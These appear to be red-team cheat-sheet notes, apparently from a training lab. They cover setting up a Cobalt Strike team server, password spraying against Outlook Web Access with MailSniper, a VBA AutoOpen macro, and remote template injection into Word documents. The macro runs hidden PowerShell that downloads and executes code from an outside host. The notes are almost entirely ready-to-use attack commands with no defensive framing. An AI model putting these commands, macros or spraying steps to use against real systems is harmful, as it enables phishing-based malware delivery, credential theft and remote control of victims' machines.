## TeamServer as a service
```powershell
nano /home/ubuntu/CobaltStrike/RunMe.sh
	/home/ubuntu/CobaltStrike/teamserver $(curl ipinfo.io/ip) P@ssw0rd profile.txt

chmod +x RunMe.sh

sudo nano /etc/systemd/system/teamserver.service

	[Unit]
	Description=Cobalt Strike Team Server
	After=network.target
	StartLimitIntervalSec=0

	[Service]
	Type=simple
	Restart=always
	RestartSec=1
	User=root
	WorkingDirectory=/home/ubuntu/CobaltStrike/
	ExecStart=sudo /home/ubuntu/CobaltStrike/RunMe.sh

	[Install]
	WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl status teamserver.service
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

## Mail Spoofing
```powershell
git clone https://github.com/MattKeeley/SpoofChecker
cd SpoofChecker
sudo apt-get update
sudo apt-get install python3-pip
pip3 install -r requirements.txt
python3 spoofy.py -d cyberbotic.io
```

## Password Spraying
```powershell
git clone https://github.com/dafthack/MailSniper
git clone https://gist.github.com/superkojiman/11076951
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
python3 namemash.py names.txt > possible.txt
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList possible.txt -OutFile valid.txt
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList valid.txt -Password Summer2022
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile gal.txt
```

## Get Downloaded File's Zone
```powershell
gc .\test.txt -Stream Zone.Identifier
```

## VBA Macros (save as .doc)
```powershell
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub
```

## Remote Template Injection
- Create .dot file containing your malicious macros
- Host the file on the cobalt server
- Create empty .dotx document and save it
- Open the empty .dotx document and then save it as .docx document
- Open .docx archive and edit word\_rels\settings.xml.rels (Target="http://nickelviper.com/template.dot")
